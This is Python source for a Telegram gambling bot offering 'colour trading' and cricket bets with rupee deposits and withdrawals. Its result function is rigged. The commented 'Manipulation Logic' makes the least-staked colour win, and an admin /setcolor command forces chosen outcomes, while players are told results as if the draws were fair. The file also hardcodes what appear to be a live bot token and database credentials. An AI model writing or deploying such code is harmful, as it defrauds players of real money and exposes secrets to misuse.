import os
import pytz
import pymongo
import random
import logging
from datetime import datetime
from threading import Thread
from flask import Flask
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from apscheduler.schedulers.asyncio import AsyncIOScheduler

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- CONFIG ---
BOT_TOKEN = "8694462304:AAHSibwJqVMLMnJLo-66twdcJhB-TIkG8ZM"
ADMIN_IDS = [7978295530, 6987036375]
IST = pytz.timezone('Asia/Kolkata')
CHANNEL_ID = -1003920368665 # Result channel

# --- DATABASE (MongoDB) ---
try:
    MONGO_URI = "mongodb+srv://gadhahaikya99_db_user:terimkcmedanda@cluster0.wffopbb.mongodb.net/?appName=Cluster0"
    client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client["chuza090_db"]
    users_col = db["users"]
    color_bets_col = db["color_bets"]
    game_state_col = db["game_state"]
    
    # Init Game State if not exists
    if not game_state_col.find_one({"id": "current"}):
        game_state_col.insert_one({"id": "current", "period": 1001, "forced_result": None})
        
    logging.info("✅ MongoDB Connected & Initialized")
except Exception as e:
    logging.error(f"❌ DB Error: {e}")

# --- SCHEDULE (Cricket) ---
IPL_SCHEDULE = {"23-04": [["MI", "CSK"]], "24-04": [["SRH", "RCB"]]}
PSL_SCHEDULE = {}

# --- FLASK ---
web_app = Flask(__name__)
@web_app.route('/')
def home(): return "SYSTEM ONLINE", 200
def run_web():
    port = int(os.environ.get("PORT", 10000))
    web_app.run(host='0.0.0.0', port=port)

# --- HELPERS ---
def get_user(uid): return users_col.find_one({"user_id": uid})

def update_bal(uid, name, amt):
    if not get_user(uid):
        users_col.insert_one({"user_id": uid, "name": name, "balance": amt})
    else:
        users_col.update_one({"user_id": uid}, {"$inc": {"balance": amt}})

# --- COLOR TRADING LOGIC ---
async def declare_color_result(app: Application):
    state = game_state_col.find_one({"id": "current"})
    curr_p, forced = state['period'], state['forced_result']
    
    bets = list(color_bets_col.find({"period": curr_p, "status": "Pending"}))
    paisa = {"RED": 0, "GREEN": 0, "VIOLET": 0}
    for b in bets: paisa[b['color']] += b['amt']

    # Manipulation Logic
    if forced:
        win_color = forced
        game_state_col.update_one({"id": "current"}, {"$set": {"forced_result": None}})
    else:
        # Jitayega usko jispe sabse kam paisa laga hai
        active = [c for c in paisa if paisa[c] > 0]
        win_color = min(paisa, key=paisa.get) if active else random.choice(["RED", "GREEN"])

    for b in bets:
        uid, b_amt, b_color = b['user_id'], b['amt'], b['color']
        if b_color == win_color:
            w_amt = b_amt * 1.9 # 1.9x payout
            update_bal(uid, "User", w_amt)
            msg = f"🥳 *PERIOD WIN!*\n💰 Won: ₹{w_amt}\n🆔 Period: `{curr_p}`\n🎨 Color: {win_color}"
        else:
            msg = f"😔 *PERIOD LOSS!*\n🆔 Period: `{curr_p}`\n🎨 Result: {win_color}"
        try: await app.bot.send_message(chat_id=uid, text=msg, parse_mode='Markdown')
        except: pass

    # Channel Update
    try: await app.bot.send_message(chat_id=CHANNEL_ID, text=f"🏆 *COLOR RESULT*\n🆔 Period: `{curr_p}`\n🎨 Winning Color: *{win_color}*", parse_mode='Markdown')
    except: pass
    
    color_bets_col.update_many({"period": curr_p}, {"$set": {"status": "Completed"}})
    game_state_col.update_one({"id": "current"}, {"$inc": {"period": 1}})

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid, name = update.effective_user.id, update.effective_user.first_name
    update_bal(uid, name, 0)
    kb = [[InlineKeyboardButton("🌈 Colour Trading", callback_data='COLOR')],
          [InlineKeyboardButton("🏏 Cricket Bet", callback_data='L_CHOOSE')],
          [InlineKeyboardButton("💰 Deposit", callback_data='D'), InlineKeyboardButton("🏦 Withdraw", callback_data='W')],
          [InlineKeyboardButton("💳 Balance", callback_data='AB'), InlineKeyboardButton("🏆 Leaderboard", callback_data='LB')],
          [InlineKeyboardButton("🎧 Support", callback_data='S_INFO')]]
    await update.message.reply_text(f"🏆 *Chuza090 PRO*\n\nWelcome {name}!", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    uid, data = query.from_user.id, query.data
    
    if data == 'COLOR':
        p = game_state_col.find_one({"id": "current"})['period']
        kb = [[InlineKeyboardButton("🔴 Red", callback_data='CB_RED'), InlineKeyboardButton("🟢 Green", callback_data='CB_GREEN')], 
              [InlineKeyboardButton("🟣 Violet", callback_data='CB_VIOLET')]]
        await query.message.reply_text(f"🌈 *COLOUR TRADING*\n🆔 Period: `{p}`\n\nSelect your colour:", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    
    elif data.startswith('CB_'):
        context.user_data['color'] = data.split('_')[1]
        await query.message.reply_text(f"🎨 Selected: {context.user_data['color']}\n\nAmt likho (Min ₹20):")
        context.user_data['step'] = 'C_BET'

    elif data == 'AB':
        u = get_user(uid); await query.message.reply_text(f"💳 Balance: *₹{u['balance']}*", parse_mode='Markdown')
    
    elif data == 'LB':
        top = users_col.find().sort("balance", -1).limit(5)
        txt = "🔥 *LEADERBOARD*\n\n"
        for i, u in enumerate(top, 1): txt += f"{i}. {u['name']} - ₹{u['balance']}\n"
        await query.message.reply_text(txt, parse_mode='Markdown')

    elif data == 'D':
        await query.message.reply_text("💰 Kitna deposit karna hai? (Min ₹100):")
        context.user_data['step'] = 'DEP'
    
    elif data == 'W':
        await query.message.reply_text("🏦 Withdrawal Amount? (Min ₹100):")
        context.user_data['step'] = 'WIT'

    elif data == 'L_CHOOSE':
        kb = [[InlineKeyboardButton("IPL 2026", callback_data='L_IPL'), InlineKeyboardButton("PSL 2026", callback_data='L_PSL')]]
        await query.message.reply_text("🏆 Select League:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith('L_'):
        league = data.split('_')[1]; today = datetime.now(IST).strftime("%d-%m")
        matches = IPL_SCHEDULE.get(today, []) if league == 'IPL' else PSL_SCHEDULE.get(today, [])
        if not matches: return await query.message.reply_text(f"❌ Aaj {league} ke matches nahi hain.")
        kb = [[InlineKeyboardButton(f"{m[0]} vs {m[1]}", callback_data=f"M_{league}_{i}")] for i, m in enumerate(matches)]
        await query.message.reply_text("🏏 Match Select Karein:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith('M_'):
        _, l, idx = data.split('_'); context.user_data.update({'l': l, 'idx': int(idx)})
        kb = [[InlineKeyboardButton("🪙 Toss", callback_data='T_TOSS'), InlineKeyboardButton("🏆 Winner", callback_data='T_WIN')]]
        await query.message.reply_text("Bet Type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith('T_'):
        context.user_data['bt'] = data.split('_')[1]
        l, idx = context.user_data['l'], context.user_data['idx']
        match = (IPL_SCHEDULE if l == 'IPL' else PSL_SCHEDULE).get(datetime.now(IST).strftime("%d-%m"))[idx]
        kb = [[InlineKeyboardButton(match[0], callback_data=f"TM_{match[0]}"), InlineKeyboardButton(match[1], callback_data=f"TM_{match[1]}")] ]
        await query.message.reply_text(f"Team Select Karein:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith('TM_'):
        context.user_data['bet_team'] = data.split('_')[1]
        await query.message.reply_text(f"✅ Selected: {context.user_data['bet_team']}\nAmount likho (Min ₹50):")
        context.user_data['step'] = 'BET_FINAL'

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid, text = update.effective_user.id, update.message.text
    step = context.user_data.get('step')

    # Admin Reply for Deposit/Support
    if uid in ADMIN_IDS and update.message.reply_to_message:
        try:
            orig = update.message.reply_to_message.text or update.message.reply_to_message.caption
            tid = int(orig.split("ID: ")[1].split("\n")[0])
            if text and text.startswith('+'):
                amt = int(text[1:].strip()); update_bal(tid, "User", amt)
                await context.bot.send_message(tid, f"✅ ₹{amt} added to wallet!")
                return await update.message.reply_text("Done.")
            elif update.message.photo:
                await context.bot.send_photo(tid, update.message.photo[-1].file_id, caption="✅ *Scan & Pay!* Send screenshot.")
                return await update.message.reply_text("QR Sent.")
        except: pass

    # User Input Processing
    if update.message.photo:
        for aid in ADMIN_IDS: await context.bot.send_photo(aid, update.message.photo[-1].file_id, caption=f"💰 *DEP SS*\nID: {uid}\nReply with +Amt")
        await update.message.reply_text("✅ Screenshot admin ko bhej diya gaya hai.")
        return

    if step == 'C_BET' and text.isdigit():
        amt = float(text); u = get_user(uid); p = game_state_col.find_one({"id": "current"})['period']
        if amt < 20 or amt > u['balance']: return await update.message.reply_text("❌ Balance kam hai!")
        update_bal(uid, "User", -amt)
        color_bets_col.insert_one({"user_id": uid, "amt": amt, "color": context.user_data['color'], "period": p, "status": "Pending"})
        await update.message.reply_text(f"✅ Bet Placed on {context.user_data['color']} for Period {p}!")
        context.user_data['step'] = None

    elif step == 'DEP' and text.isdigit():
        for aid in ADMIN_IDS: await context.bot.send_message(aid, f"🛎 *DEP REQ*\nID: {uid}\nAmt: ₹{text}\nReply with QR photo.")
        await update.message.reply_text("⏳ Admin QR bhej raha hai..."); context.user_data['step'] = None

    elif step == 'WIT' and text.isdigit():
        context.user_data.update({'w_amt': int(text), 'step': 'W_UPI'})
        await update.message.reply_text("🏦 Apna UPI ID bhejein:")

    elif step == 'W_UPI' and text:
        amt = context.user_data['w_amt']; update_bal(uid, "User", -amt)
        for aid in ADMIN_IDS: await context.bot.send_message(aid, f"🏦 *WITHDRAW*\nID: {uid}\nAmt: ₹{amt}\nUPI: {text}")
        await update.message.reply_text("✅ Withdrawal request sent!"); context.user_data['step'] = None

    elif step == 'BET_FINAL' and text.isdigit():
        amt = int(text); u = get_user(uid)
        if amt < 50 or amt > u['balance']: return await update.message.reply_text("❌ Balance check karein!")
        update_bal(uid, "User", -amt)
        for aid in ADMIN_IDS: await context.bot.send_message(aid, f"🎲 *CRICKET BET*\nID: {uid}\nTeam: {context.user_data['bet_team']}\nAmt: ₹{amt}")
        await update.message.reply_text(f"✅ Bet Placed on {context.user_data['bet_team']}!"); context.user_data['step'] = None

# Admin Command to Fix Result
async def set_color(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    try:
        col = context.args[0].upper()
        game_state_col.update_one({"id": "current"}, {"$set": {"forced_result": col}})
        await update.message.reply_text(f"✅ Next Result Fixed: {col}")
    except: await update.message.reply_text("Usage: `/setcolor RED` (RED/GREEN/VIOLET)")

# --- MAIN ---
async def post_init(app: Application):
    scheduler = AsyncIOScheduler()
    # Har 2 minute mein result aayega
    scheduler.add_job(declare_color_result, 'interval', minutes=2, args=[app])
    scheduler.start()

def main():
    Thread(target=run_web, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setcolor", set_color))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL, message_handler))
    logging.info("🚀 All-in-One Bot Starting...")
    app.run_polling(drop_pending_updates=True, stop_signals=None, close_loop=False)

if __name__ == '__main__':
    main()
